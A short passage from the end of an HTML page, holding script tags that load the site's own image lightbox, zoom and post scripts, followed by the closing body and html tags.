src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
